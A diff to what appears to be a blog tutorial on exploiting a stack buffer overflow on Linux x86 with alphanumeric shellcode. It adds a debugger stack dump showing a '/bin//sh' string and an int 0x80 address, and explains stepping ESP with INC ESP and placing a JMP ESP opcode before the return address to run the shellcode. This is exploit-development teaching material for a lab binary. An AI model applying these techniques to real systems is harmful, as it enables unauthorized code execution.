@@ -320,7 +320,21 @@ so we can pass the first 6 NOP bytes + 66 shellcode bytes + 4 EIP address redire
 
 As we can see in this case we can choose an adress at the end of NOP zone before our shellcode so ```0xbffff788```. Now we can observe what happens in the stack when we use this address
 
+![](/assets/images/linux/x86/alphanumeric_0.gif)<br>
 
 
-
+```
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff52c --> 0xbffff530 ("/bin//sh")
+0004| 0xbffff530 ("/bin//sh")
+0008| 0xbffff534 ("//sh")
+0012| 0xbffff538 --> 0x0 
+0016| 0xbffff53c --> 0xffff80cd 
+0020| 0xbffff540 --> 0x0 
+0024| 0xbffff544 --> 0xbffff5d4 --> 0xbffff728 ("/home/bolo/alphanumeric/bof")
+0028| 0xbffff548 --> 0xbffff5e0 --> 0xbffff7d4 ("LC_PAPER=it_IT.UTF-8")
+[------------------------------------------------------------------------------]
+```
+As we can see we execute perfectly our shellcode since we have to execute it with the ```0xffff80cd``` (int 0x80) instruction. We can see also that the instruction is down 16 words in the stack. So now we can INC ESP 16 times to move the ```0xffff80cd``` address at the top of the stack. INC ESP is in our table of instrctions and has opcdoe 0x44 or "D".<br>
+Last thing, call the ```0xffff80cd``` with a JMP ESP instruction. I know it is not in the table of our approved instruction and that's the last trick: the JMP ESP opcode is ```\xff\xe4``` and we can put this opcode just before the return address and not inside the shellcode.
 
